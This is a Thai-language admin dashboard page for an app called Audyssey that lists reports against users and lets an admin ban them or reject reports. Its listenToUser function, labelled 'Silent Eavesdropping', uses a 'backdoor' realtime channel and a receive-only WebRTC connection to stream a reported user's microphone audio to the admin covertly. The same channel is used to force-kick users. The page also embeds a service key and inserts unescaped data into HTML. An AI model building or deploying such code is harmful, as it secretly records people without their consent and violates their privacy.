<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Audyssey Admin - ระบบจัดการหลังบ้าน</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        
        body { background-color: #050505; color: #fff; padding: 30px; }
        
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 20px; margin-bottom: 30px; }
        .logo { font-size: 28px; font-weight: 700; color: #fff; }
        .status-online { display: flex; align-items: center; gap: 8px; font-size: 14px; color: #aaa; }
        .dot { width: 10px; height: 10px; background-color: #39ff14; border-radius: 50%; box-shadow: 0 0 8px #39ff14; }

        /* แผงควบคุมการดักฟัง */
        .listening-panel { 
            background: rgba(0, 123, 255, 0.1); border: 1px solid #007bff; 
            padding: 20px; border-radius: 8px; margin-bottom: 30px; 
            display: none; align-items: center; justify-content: space-between; 
        }
        .listening-info { display: flex; align-items: center; gap: 15px; font-size: 16px; }
        .wave-icon { width: 24px; height: 24px; fill: #007bff; animation: pulse 1s infinite; }

        /* ตารางรายงาน */
        .table-container { width: 100%; overflow-x: auto; background: #111; border-radius: 8px; border: 1px solid #222; }
        table { width: 100%; border-collapse: collapse; min-width: 800px; }
        th, td { padding: 16px 20px; text-align: left; border-bottom: 1px solid #222; font-size: 14px; }
        th { background: #1a1a1a; color: #aaa; font-weight: 600; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; }
        tr:hover { background: #181818; }
        tr:last-child td { border-bottom: none; }
        
        /* ป้ายสถานะ */
        .badge { padding: 6px 10px; border-radius: 4px; font-size: 12px; font-weight: 600; }
        .badge.pending { background: rgba(255, 193, 7, 0.15); color: #ffc107; border: 1px solid rgba(255, 193, 7, 0.3); }
        .badge.banned { background: rgba(220, 53, 69, 0.15); color: #dc3545; border: 1px solid rgba(220, 53, 69, 0.3); }
        .badge.rejected { background: rgba(108, 117, 125, 0.15); color: #aaa; border: 1px solid rgba(108, 117, 125, 0.3); }

        /* ปุ่ม Action */
        .action-btns { display: flex; gap: 8px; }
        .btn { padding: 8px 14px; border: none; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: 600; transition: 0.2s; display: flex; align-items: center; gap: 6px;}
        .btn-listen { background: #fff; color: #000; }
        .btn-listen:hover { background: #ddd; }
        .btn-ban { background: rgba(220, 53, 69, 0.2); color: #ff4d4d; border: 1px solid rgba(220, 53, 69, 0.5); }
        .btn-ban:hover { background: #dc3545; color: #fff; }
        .btn-reject { background: transparent; color: #888; border: 1px solid #444; }
        .btn-reject:hover { background: #333; color: #fff; }

        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
    </style>
</head>
<body>

    <div class="header">
        <div class="logo">Audyssey Admin Dashboard</div>
        <div class="status-online">
            <div class="dot"></div> <span id="adminStatus">เชื่อมต่อระบบแล้ว</span>
        </div>
    </div>

    <!-- แผงควบคุมเวลาแอบฟัง (ซ่อนไว้ก่อน) -->
    <div id="listenPanel" class="listening-panel">
        <div class="listening-info">
            <svg class="wave-icon" viewBox="0 0 24 24"><path d="M12 3v18m-4-14v10m8-10v10m-12-6v2m16-2v2"/></svg>
            <strong>กำลังดักฟังเป้าหมาย ID:</strong> <span id="targetUserIdText" style="font-family: monospace; color:#aaa;"></span>
        </div>
        <button class="btn btn-ban" onclick="stopListening()">หยุดดักฟัง</button>
    </div>
    <audio id="adminAudio" autoplay></audio>

    <h2 style="margin-bottom: 20px; font-size: 18px; color: #ddd;">รายงานผู้กระทำผิดล่าสุด</h2>
    
    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>เวลาที่ถูกรายงาน</th>
                    <th>ID ผู้ถูกรายงาน</th>
                    <th>สถานะ</th>
                    <th>การจัดการ</th>
                </tr>
            </thead>
            <tbody id="reportTableBody">
                <tr><td colspan="4" style="text-align: center; color: #666;">กำลังโหลดข้อมูล...</td></tr>
            </tbody>
        </table>
    </div>

    <script>
        // --- 1. ตั้งค่า Supabase ของคุณ ---
        const SUPABASE_URL = 'https://vyvuhwnhgcmbokkshnxo.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ5dnVod25oZ2NtYm9ra3NobnhvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgwMjU1MDIsImV4cCI6MjEwMzYwMTUwMn0.FYzIS30XtiPNaBRxv6VaS6VOG4hRmP1rFljFINwm_do';
        const sb = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        let adminPc = null;
        let activeBackdoor = null;
        const rtcConfig = { 
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ] 
        };

        // --- 2. โหลดข้อมูลเมื่อเปิดหน้าเว็บ ---
        window.onload = async () => {
            loadReports();
            
            // เปิดระบบ Realtime รอรับรายงานใหม่ที่เด้งเข้ามา
            sb.channel('realtime-reports')
              .on('postgres_changes', { event: '*', schema: 'public', table: 'reports' }, payload => {
                  loadReports(); // โหลดตารางใหม่ทันทีที่มีการเปลี่ยนแปลง
              }).subscribe();
        };

        // --- 3. ฟังก์ชันดึงตาราง Reports ---
        async function loadReports() {
            const { data, error } = await sb.from('reports').select('*').order('created_at', { ascending: false });
            if (error) {
                console.error(error);
                return;
            }
            
            const tbody = document.getElementById('reportTableBody');
            tbody.innerHTML = '';
            
            if (data.length === 0) {
                tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: #666;">ยังไม่มีรายงานผู้กระทำผิด</td></tr>';
                return;
            }

            data.forEach(r => {
                const tr = document.createElement('tr');
                const dateObj = new Date(r.created_at);
                const dateStr = dateObj.toLocaleDateString('th-TH') + ' ' + dateObj.toLocaleTimeString('th-TH');
                
                // แปลงสถานะเป็นป้ายสีสวยๆ
                let statusBadge = `<span class="badge pending">รอดำเนินการ</span>`;
                let actionButtons = `
                    <div class="action-btns">
                        <button class="btn btn-listen" onclick="listenToUser('${r.reported_user_id}')">🎧 ดักฟัง</button>
                        <button class="btn btn-ban" onclick="banUser('${r.reported_user_id}', '${r.id}')">⛔ แบนถาวร</button>
                        <button class="btn btn-reject" onclick="rejectReport('${r.id}')">ปฏิเสธ</button>
                    </div>
                `;

                if(r.status === 'banned') {
                    statusBadge = `<span class="badge banned">ถูกแบนแล้ว</span>`;
                    actionButtons = `<span style="color:#666; font-size:12px;">ดำเนินการแล้ว</span>`;
                }
                if(r.status === 'rejected') {
                    statusBadge = `<span class="badge rejected">ปฏิเสธคำร้อง</span>`;
                    actionButtons = `<span style="color:#666; font-size:12px;">ดำเนินการแล้ว</span>`;
                }

                tr.innerHTML = `
                    <td>${dateStr}</td>
                    <td style="font-family: monospace; color: #ccc;">${r.reported_user_id}</td>
                    <td>${statusBadge}</td>
                    <td>${actionButtons}</td>
                `;
                tbody.appendChild(tr);
            });
        }

        // --- 4. ระบบแอบฟัง (Silent Eavesdropping) ---
        async function listenToUser(targetUserId) {
            stopListening(); // ปิดสายเก่าก่อน (ถ้ามี)
            
            document.getElementById('listenPanel').style.display = 'flex';
            document.getElementById('targetUserIdText').innerText = targetUserId;

            adminPc = new RTCPeerConnection(rtcConfig);
            
            // เมื่อได้รับเสียงจากเป้าหมาย ให้เล่นออกลำโพงแอดมินทันที
            adminPc.ontrack = e => { 
                document.getElementById('adminAudio').srcObject = e.streams[0]; 
            };

            adminPc.onicecandidate = e => {
                if (e.candidate && activeBackdoor) {
                    activeBackdoor.send({ type: 'broadcast', event: 'admin_cmd', payload: { action: 'candidate', candidate: e.candidate, from: 'admin' } });
                }
            };

            // เชื่อมต่อช่องทางลับไปหาเป้าหมาย (Backdoor Channel)
            activeBackdoor = sb.channel(`backdoor_${targetUserId}`);
            activeBackdoor.on('broadcast', { event: 'admin_cmd' }, async (msg) => {
                const data = msg.payload;
                if (data.action === 'answer') {
                    await adminPc.setRemoteDescription(data.answer);
                } else if (data.action === 'candidate' && data.from === 'user') {
                    adminPc.addIceCandidate(data.candidate);
                }
            }).subscribe(async (status) => {
                if(status === 'SUBSCRIBED') {
                    // ส่งคำขอฟังเสียง (Offer) ไปหาเป้าหมาย โดยเป็นการรับเสียงฝ่ายเดียว ไม่ส่งเสียงแอดมินไปให้
                    const offer = await adminPc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: false });
                    await adminPc.setLocalDescription(offer);
                    activeBackdoor.send({ type: 'broadcast', event: 'admin_cmd', payload: { action: 'listen', offer: offer } });
                }
            });
        }

        function stopListening() {
            if (adminPc) { adminPc.close(); adminPc = null; }
            if (activeBackdoor) { sb.removeChannel(activeBackdoor); activeBackdoor = null; }
            document.getElementById('adminAudio').srcObject = null;
            document.getElementById('listenPanel').style.display = 'none';
        }

        // --- 5. ระบบสั่งแบนและเตะผู้ใช้ (Ban & Kick) ---
        async function banUser(userId, reportId) {
            if(!confirm('ยืนยันการแบนผู้ใช้นี้ถาวร? (ผู้ใช้จะถูกเตะออกจากระบบทันที)')) return;
            
            // 1. อัปเดตตาราง Profile ให้ติดแบน
            await sb.from('profiles').update({ is_banned: true }).eq('id', userId);
            
            // 2. อัปเดตสถานะ Report เป็น banned
            await sb.from('reports').update({ status: 'banned' }).eq('id', reportId);
            
            // 3. ส่งสัญญาณเตะ (Kick) ผ่านช่องทางลับ
            const kickChannel = sb.channel(`backdoor_${userId}`);
            kickChannel.subscribe((status) => {
                if(status === 'SUBSCRIBED') {
                    kickChannel.send({ type: 'broadcast', event: 'admin_cmd', payload: { action: 'ban' } });
                }
            });
            
            // ถ้าแอบฟังเขาอยู่ ให้หยุดฟัง
            stopListening();
            alert('แบนและเตะผู้ใช้งานสำเร็จ!');
            loadReports(); // รีเฟรชตาราง
        }

        // --- 6. ระบบปฏิเสธคำร้อง (ถ้าไม่ได้ทำผิด) ---
        async function rejectReport(reportId) {
            if(!confirm('ยืนยันการปฏิเสธคำร้องรายงานนี้?')) return;
            await sb.from('reports').update({ status: 'rejected' }).eq('id', reportId);
            loadReports();
        }
    </script>
</body>
</html>
